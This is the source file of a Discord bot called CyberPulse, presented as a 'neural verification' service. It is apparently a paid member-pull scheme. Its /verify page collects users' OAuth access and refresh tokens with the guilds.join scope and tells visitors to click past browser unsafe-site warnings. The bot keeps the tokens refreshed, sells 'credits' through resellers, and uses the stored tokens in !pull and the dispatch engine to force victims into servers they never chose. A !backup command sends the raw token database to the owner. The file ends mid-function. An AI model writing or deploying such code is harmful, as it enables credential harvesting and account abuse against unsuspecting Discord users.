const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes,
  AttachmentBuilder
} = require('discord.js');
const express = require('express');
const http = require('http');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
const MONGO_URI = process.env.MONGO_URI;

const OWNER_ID = '1370594462941581433';
const DEFAULT_BANNER = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
  process.exit(1);
}

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Neural Cluster Linked Successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const operationSchema = new mongoose.Schema({
  opId: { type: String, required: true, unique: true },
  discordId: { type: String, required: true },
  targetGuildId: String,
  requestedQuantity: Number,
  successfulQuantity: { type: Number, default: 0 },
  status: { type: String, default: 'PROCESSING' },
  timestamp: { type: Date, default: Date.now }
}, { collection: 'operations' });
const Operation = mongoose.model('Operation', operationSchema);

const activeSessions = new Map();

async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

function calculatePrice(quantity) {
  let bonusPercent = 0;
  let tierName = '🌌 Standard Tier';
  if (quantity >= 10000) { bonusPercent = 15; tierName = '💎 Enterprise Nexus Tier'; }
  else if (quantity >= 2500) { bonusPercent = 5; tierName = '⚡ Pro Quantum Tier'; }
  else if (quantity >= 500) { bonusPercent = 1; tierName = '🚀 Starter Pulse Tier'; }

  const bonusCredits = Math.floor((quantity * bonusPercent) / 100);
  const totalCreditsGiven = quantity + bonusCredits;
  return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
}

// ==================== EXPRESS HEALTH SERVER ====================
const app = express();
const server = http.createServer(app);
app.use(express.json());

// Verification Landing Screen & OAuth Route
app.get('/verify', (req, res) => {
  const discordOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
  
  const loadingScreenHtml = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>CYBERPULSE // Neural Verification Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body {
        background-color: #04050a;
        background-image: radial-gradient(circle at 50% 30%, rgba(112, 0, 255, 0.25), transparent 70%);
        color: #e2e8f0; font-family: 'Rajdhani', sans-serif;
        height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
      }
      .container { width: 100%; max-width: 440px; padding: 20px; text-align: center; }
      .card {
        background: rgba(13, 14, 24, 0.95); border: 1px solid rgba(139, 92, 246, 0.5);
        border-radius: 20px; padding: 40px 30px; backdrop-filter: blur(20px);
        box-shadow: 0 0 60px rgba(112, 0, 255, 0.4);
      }
      .title { font-family: 'Orbitron', sans-serif; font-size: 1.5rem; color: #38bdf8; margin-bottom: 12px; letter-spacing: 2px; }
      .subtitle { font-size: 0.95rem; color: #94a3b8; margin-bottom: 30px; }
      .spinner {
        width: 68px; height: 68px; margin: 0 auto 30px; border: 4px solid rgba(139, 92, 246, 0.2);
        border-top: 4px solid #10b981; border-radius: 50%; animation: spin 0.9s linear infinite;
      }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      .status-text { font-family: 'Orbitron', sans-serif; font-size: 0.85rem; color: #a78bfa; margin-bottom: 25px; letter-spacing: 1px; }
      .btn-verify {
        display: none; width: 100%; padding: 15px; font-family: 'Orbitron', sans-serif; font-size: 0.95rem; font-weight: 700;
        color: white; background: linear-gradient(135deg, #7000ff, #38bdf8); border: none; border-radius: 10px;
        cursor: pointer; text-decoration: none; box-shadow: 0 4px 25px rgba(112, 0, 255, 0.5); transition: transform 0.2s;
      }
      .btn-verify:hover { transform: translateY(-3px); }
      .bypass-box { margin-top: 20px; font-size: 0.8rem; color: #64748b; line-height: 1.4; }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="card">
        <h1 class="title">⚡ CYBERPULSE GATEWAY</h1>
        <p class="subtitle">Initializing quantum encrypted handshake...</p>
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">Scanning Neural Signature...</div>
        <a href="${discordOAuthUrl}" class="btn-verify" id="verifyBtn">🚀 AUTHORIZE DISCORD LINK</a>
        <div class="bypass-box">If Google warns about unsafe site, click <b>Details</b> &rarr; <b>Visit this unsafe site</b> to proceed safely.</div>
      </div>
    </div>
    <script>
      setTimeout(() => {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('statusText').innerText = '🛡️ SECURE HANDSHAKE VERIFIED';
        const btn = document.getElementById('verifyBtn');
        btn.style.display = 'block';
        window.location.href = "${discordOAuthUrl}";
      }, 2000);
    </script>
  </body>
  </html>
  `;
  res.send(loadingScreenHtml);
});

// OAuth Callback Route
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('❌ Authorization Protocol Failed.');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;
    const expiresAt = new Date(Date.now() + expires_in * 1000);

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const discordId = userResponse.data.id;
    const username = userResponse.data.username;

    await VerifiedUser.findOneAndUpdate(
      { discordId },
      { username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
      { upsert: true, new: true }
    );

    client.guilds.cache.forEach(async (guild) => {
      try {
        const config = await GuildConfig.findOne({ guildId: guild.id });
        if (config && config.verifiedRoleId) {
          const member = await guild.members.fetch(discordId).catch(() => null);
          if (member) await member.roles.add(config.verifiedRoleId).catch(() => {});
        }
      } catch (e) {}
    });

    const successHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head><title>CYBERPULSE // Verified</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500&display=swap" rel="stylesheet"><style>body{background:#04050a;color:#fff;font-family:'Rajdhani',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}.card{background:#0d0e18;border:1px solid #10b981;padding:45px;border-radius:16px;box-shadow:0 0 40px rgba(16,185,129,0.35)}h1{font-family:'Orbitron';color:#10b981;margin-bottom:15px;font-size:1.8rem}</style></head>
    <body><div class="card"><h1>⚡ ACCESS GRANTED</h1><p>Neural verification successful! You may now close this browser window and return to Discord.</p></div></body>
    </html>`;
    res.send(successHtml);
  } catch (error) {
    res.status(500).send('❌ Authentication Token Handshake Failed.');
  }
});

app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE QUANTUM BOT CORE ONLINE'));
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`));

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildPresences]
});

const slashCommands = [
  new SlashCommandBuilder().setName('verifiedrole').setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => option.setName('role').setDescription('Select the verified role').setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('clientReady', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands }); } catch (err) {}
});

// Auto-Healer & Pruner (Delayed 10 mins on boot)
setTimeout(() => {
  setInterval(async () => {
    try {
      const users = await VerifiedUser.find({});
      for (const user of users) {
        try {
          await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${user.accessToken}` }, timeout: 3000 });
        } catch (err) {
          try {
            const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
              client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
            }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            user.accessToken = res.data.access_token;
            user.refreshToken = res.data.refresh_token;
            user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
            await user.save();
          } catch (refreshErr) { await VerifiedUser.deleteOne({ discordId: user.discordId }); }
        }
        await new Promise(r => setTimeout(r, 200));
      }
    } catch (err) {}
  }, 3600000);
}, 600000);

process.on('unhandledRejection', error => {});
process.on('uncaughtException', error => {});

// ==================== DISCORD MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    // 1. !verify [image_url]
    if (command === 'verify') {
      const customImage = args[0] && args[0].startsWith('http') ? args[0] : DEFAULT_BANNER;
      const embed = new EmbedBuilder().setColor(0x7000ff)
        .setTitle('⚡ CYBERPULSE NEURAL VERIFICATION 🔮')
        .setDescription('✨ Click the secure quantum button below to complete authorization and sync your secure credentials.')
        .setImage(customImage)
        .setFooter({ text: '🛡️ CyberPulse Quantum Security Protocol v9.5' });
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setLabel('Verify System Clearance').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/verify`).setEmoji('🔐')
      );
      return message.reply({ embeds: [embed], components: [row] });
    }

    // 2. !panel [image_url]
    if (command === 'panel') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied:** Only the absolute bot owner or authorized partners can deploy the master nexus panel.');
      const customImage = args[0] && args[0].startsWith('http') ? args[0] : DEFAULT_BANNER;
      const embed = new EmbedBuilder().setColor(0x7000ff)
        .setTitle('💎 CYBERPULSE MASTER NEXUS HUB 🚀')
        .setDescription('🛒 **Buy Credits:** Open an encrypted private administration ticket.\n💳 **My Credits:** Inspect your live neural credit balance.\n⚡ **Add Members:** Initialize high-speed member deployment sequence.\n🤖 **Add Bot:** Invite CyberPulse into your private infrastructure.')
        .setImage(customImage)
        .setFooter({ text: '⚡ CyberPulse Command Center • All Systems Operational' });
      
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
        new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
      );
      return message.reply({ embeds: [embed], components: [row] });
    }

    // 3. !stock [image_url] (Exact match to reference style)
    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      const customImage = args[0] && args[0].startsWith('http') ? args[0] : DEFAULT_BANNER;

      const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setTitle(`${message.guild.name} Stock`)
        .setDescription(`• **offline:** \`${totalStock.toLocaleString()}\` 👥`)
        .setImage(customImage)
        .setTimestamp();

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_refresh_stock').setStyle(ButtonStyle.Primary).setEmoji('🔄')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 4. !calculator / !calc
    if (command === 'calculator' || command === 'calc') {
      const amount = parseInt(args[0], 10);
      if (isNaN(amount) || amount <= 0) return message.reply('⚠️ **Usage:** `!calculator <amount>`');
      const calc = calculatePrice(amount);
      const embed = new EmbedBuilder().setColor(0x38bdf8)
        .setTitle('📊 CYBERPULSE QUANTUM PRICING CALCULATOR 💳')
        .addFields(
          { name: '📦 Target Order Base', value: `\`${calc.quantity.toLocaleString()} Credits\``, inline: true },
          { name: '🏆 Active Pricing Tier', value: `\`${calc.tierName}\``, inline: true },
          { name: '🎁 Bulk Tier Bonus %', value: `\`${calc.bonusPercent}%\``, inline: true },
          { name: '🎉 Extra Bonus Awarded', value: `\`+${calc.bonusCredits.toLocaleString()} Credits\``, inline: true },
          { name: '🌟 Total Credits Received', value: `\`${calc.totalCreditsGiven.toLocaleString()} Credits\``, inline: true }
        )
        .setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    // 5. !topresellers / !resellerboard
    if (command === 'topresellers' || command === 'resellerboard') {
      const topResellers = await UserCredit.find({ offlineConsumed: { $gt: 0 } }).sort({ offlineConsumed: -1 }).limit(5);
      if (topResellers.length === 0) return message.reply('📊 No reseller volume tracked in the quantum ledger yet.');
      let desc = '🏆 **Top Elite CyberPulse Resellers by Sales Volume:**\n\n';
      topResellers.forEach((res, i) => { desc += `${i === 0 ? '👑' : '⭐'} **#${i+1}** <@${res.discordId}> — **${res.offlineConsumed.toLocaleString()}** Credits Deployed\n`; });
      return message.reply({ embeds: [new EmbedBuilder().setColor(0x10b981).setTitle('📊 CYBERPULSE RESELLER LEADERBOARD 🚀').setDescription(desc).setTimestamp()] });
    }

    // 6. !backup
    if (command === 'backup') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Only the supreme bot owner can execute database backups.');
      const verifiedUsers = await VerifiedUser.find({});
      const userCredits = await UserCredit.find({});
      const buffer = Buffer.from(JSON.stringify({ timestamp: new Date(), verifiedUsers, userCredits }, null, 2));
      const attachment = new AttachmentBuilder(buffer, { name: `CyberPulse_Quantum_Backup_${Date.now()}.json` });
      return message.author.send({ content: '⚡ **CYBERPULSE ENCRYPTED DATABASE BACKUP 📦**', files: [attachment] })
        .then(() => message.reply('✅ Encrypted database snapshot successfully dispatched to your DMs!'))
        .catch(() => message.reply('❌ Failed to DM backup file. Please check your direct message privacy settings.'));
    }

    // 7. !stats
    if (command === 'stats') {
      const totalStock = await VerifiedUser.countDocuments();
      const totalOps = await Operation.countDocuments();
      const completedOps = await Operation.countDocuments({ status: 'COMPLETED' });
      const memUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

      const embed = new EmbedBuilder().setColor(0x7000ff)
        .setTitle('📊 CYBERPULSE SYSTEM TELEMETRY & STATS ⚡')
        .setDescription('Real-time operational diagnostics of the bot core:')
        .addFields(
          { name: '📦 Active Verified Stock', value: `\`${totalStock.toLocaleString()} Accounts\``, inline: true },
          { name: '🚀 Total Dispatches Run', value: `\`${totalOps.toLocaleString()} Ops (${completedOps} Completed)\``, inline: true },
          { name: '💾 RAM Memory Usage', value: `\`${memUsage} MB\``, inline: true },
          { name: '🌐 Cluster Status', value: '`ONLINE // 100% OPERATIONAL`', inline: false }
        )
        .setImage(DEFAULT_BANNER)
        .setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    // 8. !dashboard
    if (command === 'dashboard') {
      const embed = new EmbedBuilder().setColor(0x38bdf8)
        .setTitle('🌐 CYBERPULSE CONTROL & WEB DASHBOARD 🚀')
        .setDescription(`Access your command panels, monitor queue statuses, and review active node dispatches instantly via our secure gateway:\n\n🔗 **[Click Here to Access Control Hub](${PUBLIC_URL}/dashboard)**`)
        .setImage(DEFAULT_BANNER)
        .setFooter({ text: 'CyberPulse Secure Web Portal 🛡️' });
      return message.reply({ embeds: [embed] });
    }

    // 9. !gc @user <amount>
    if (command === 'gc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ **Usage:** `!gc @user <amount>`');
      const calc = calculatePrice(amount);
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      uc.balance += calc.totalCreditsGiven; uc.offlineAdded += calc.totalCreditsGiven;
      await uc.save();
      return message.reply(`📦 Successfully added **${amount.toLocaleString()}** base credits (+**${calc.bonusCredits.toLocaleString()}** tier bonus) to <@${targetUser.id}>! 🌟`);
    }

    // 10. !rc @user <amount>
    if (command === 'rc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ **Usage:** `!rc @user <amount>`');
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      const deducted = Math.min(uc.balance, amount);
      uc.balance = Math.max(0, uc.balance - amount); uc.offlineConsumed += deducted;
      await uc.save();
      return message.reply(`🔻 Deducted **${amount.toLocaleString()}** credits from <@${targetUser.id}>. Remaining balance: \`${uc.balance.toLocaleString()}\`.`);
    }

    // 11. !partner @user
    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!partner @user`');
      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Successfully appointed <@${targetUser.id}> as an official CyberPulse Partner! 🔥`);
    }

    // 12. !reseller @user
    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!reseller @user`');
      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Successfully registered <@${targetUser.id}> into the CyberPulse Reseller network! ⚡`);
    }

    // 13. !resale @user <amount>
    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('⚠️ **Usage:** `!resale @user <amount>`');
      const isReseller = await Reseller.findOne({ discordId: message.author.id });
      if (!isReseller && !hasPrivileges) return message.reply('❌ **Access Denied:** You must be a registered reseller to transfer credits.');
      let sender = await UserCredit.findOne({ discordId: message.author.id });
      if (!sender || sender.balance < amount) return message.reply('❌ **Error:** Insufficient credit balance.');
      sender.balance -= amount; sender.offlineConsumed += amount; await sender.save();
      let recipient = await UserCredit.findOne({ discordId: targetUser.id }) || new UserCredit({ discordId: targetUser.id, balance: 0 });
      recipient.balance += amount; recipient.offlineAdded += amount; await recipient.save();
      return message.reply(`💼 Successfully transferred **${amount.toLocaleString()}** credits to <@${targetUser.id}>! 🚀`);
    }

    // 14. !rbal / !irbal
    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || { balance: 0, offlineAdded: 0, offlineConsumed: 0 };
      const embed = new EmbedBuilder().setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Ledger — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** 🟢 Active Quantum Node\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Online Added:** 0\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📈 **Reaction Added:** 0\n📉 **Online Consumed:** 0\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}\n📉 **Reaction Consumed:** 0`)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
        .setFooter({ text: 'CyberPulse • Reseller Quantum Ledger' }).setTimestamp();
      return message.reply({ embeds: [embed] });
    }

    // 15. !pull
    if (command === 'pull') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetGuildId = args[0];
      if (!targetGuildId) return message.reply('❌ **Usage:** `!pull <GUILD_ID> [LIMIT]`');
      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 Synchronizing database tokens into target server \`${targetGuildId}\`...`);
      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        let successfulJoins = 0;
        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) continue;
            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {}
        }
        return statusMsg.edit(`✅ Successfully synchronized and pulled **${successfulJoins.toLocaleString()}** members into target server! 🔥`);
      } catch (err) { return statusMsg.edit('❌ Critical error executing manual token synchronization pull.'); }
    }

    // 16. !bal / !balance
    if (command === 'bal' || command === 'balance') {
      const uc = await UserCredit.findOne({ discordId: message.author.id }) || { balance: 0 };
      return message.reply(`💳 **Your Neural Credit Balance:** \`${uc.balance.toLocaleString()} credits\` 🌟`);
    }

  } catch (err) {}
});

// Background Dispatch Engine
async function executeDiscordDispatch(opId, userId, guildId, quantity, messageRef) {
  try {
    const targetGuild = await client.guilds.fetch(guildId);
    const verifiedUsers = await VerifiedUser.find({});
    let successful = 0;
    for (const userRecord of verifiedUsers) {
      if (successful >= quantity) break;
      try {
        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
        if (member) continue;
        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
        successful++;
        if (successful % 5 === 0) {
          await messageRef.edit(`🚀 Quantum Dispatching Members ⏳\nProgress: ${successful}/${quantity}\n🆔 Operation ID: \`${opId}\``).catch(() => {});
        }
        await new Promise(r => setTimeout(r, 600));
      } catch (err) {}
    }
    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
    await messageRef.edit(`✅ Operation \`${opId}\` Successfully Completed! Deployed **${successful.toLocaleString()}** members. 🔥`);
  } catch (err) {
    await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' });
    await messageRef.edit(`❌ Operation \`${opId}\` failed due to a target server permission or rate-limit error.`);
  }
}

// ==================== DISCORD INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand() && interaction.commandName === 'verifiedrole') {
      const role = interaction.options.getRole('role');
      await GuildConfig.findOneAndUpdate({ guildId: interaction.guild.id }, { verifiedRoleId: role.id }, { upsert: true });
      return interaction.reply({ content: `✅ Verified role successfully updated to ${role}! 🛡️`, ephemeral: true });
    }

    if (interaction.isButton()) {
      if (interaction.customId === 'btn_refresh_stock') {
        const totalStock = await VerifiedUser.countDocuments();
        const embed = new EmbedBuilder()
          .setColor(0x2b2d31)
          .setTitle(`${interaction.guild.name} Stock`)
          .setDescription(`• **offline:** \`${totalStock.toLocaleString()}\` 👥`)
          .setImage(DEFAULT_BANNER)
          .setTimestamp();
        return interaction.update({ embeds: [embed] });
      }

      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) return interaction.reply({ content: `❌ Active purchase ticket already exists: ${existing}`, ephemeral: true });

        const channel = await interaction.guild.channels.create({
          name: channelName, type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
          ]
        });
        const ticketEmbed = new EmbedBuilder().setColor(0x7000ff)
          .setTitle('🛒 CYBERPULSE CREDIT PURCHASE TICKET ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\nState your desired credit package or custom order volume to administration.\n\n**📦 Tier Packages:**\n• Starter: 500 Credits (1% Bonus)\n• Pro: 2,500 Credits (5% Bonus)\n• Enterprise: 10,000 Credits (15% Bonus)`);
        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed] });
        return interaction.reply({ content: `✅ Purchase ticket successfully created: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_my_credits') {
        const uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        return interaction.reply({ content: `💳 **Your Neural Balance:** \`${uc.balance.toLocaleString()}\` credits ⚡`, ephemeral: true });
      }

      if (interaction.customId === 'btn_add_members') {
        const modal = new ModalBuilder().setCustomId('modal_server_id').setTitle('CyberPulse Quantum Dispatch 🚀');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel('Target Server ID').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
      }

      if (interaction.customId === 'btn_confirm_purchase') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Dispatch session expired.', ephemeral: true });
        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc || uc.balance < session.quantity) return interaction.update({ content: `❌ Insufficient credit balance.`, embeds: [], components: [] });

        uc.balance -= session.quantity; uc.offlineConsumed += session.quantity; await uc.save();
        const opId = `DISCORD-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
        await Operation.create({ opId, discordId: interaction.user.id, targetGuildId: session.serverId, requestedQuantity: session.quantity });

        await interaction.update({ content: `🚀 Dispatching members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation ID: \`${opId}\``, embeds: [], components: [] });
        const messageRef = await interaction.fetchReply();
        executeDiscordDispatch(opId, interaction.user.id, session.serverId, session.quantity, messageRef);
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'modal_server_id') {
        const serverId = interaction.fields.getTextInputValue('input_server_id');
        try {
          const targetGuild = await client.guilds.fetch(serverId);
          const botMember = await targetGuild.members.fetch(client.user.id);
          if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return interaction.reply({ content: '❌ **Security Pre-Flight Failed:** CyberPulse bot lacks `Manage Roles` permission in target server.', ephemeral: true });
          }
          activeSessions.set(interaction.user.id, { serverId, guildName: targetGuild.name, memberCount: targetGuild.memberCount });
          const selectMenu = new StringSelectMenuBuilder().setCustomId('select_token_type').setPlaceholder('Select token protocol').addOptions(new StringSelectMenuOptionBuilder().setLabel('offline').setValue('offline'));
          return interaction.reply({ content: `✅ Pre-Flight Scan Passed for **${targetGuild.name}**! Select token protocol:`, components: [new ActionRowBuilder().addComponents(selectMenu)], ephemeral: true });
